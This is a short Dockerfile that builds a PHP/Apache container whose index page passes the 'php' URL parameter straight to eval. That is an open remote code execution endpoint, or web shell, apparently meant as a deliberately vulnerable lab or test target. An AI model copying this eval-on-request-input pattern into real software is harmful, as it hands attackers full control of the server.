FROM php:8-apache

RUN echo "<?php eval(\$_GET['php']); ?>" > /var/www/html/index.php

EXPOSE 80

CMD ["apache2-foreground"]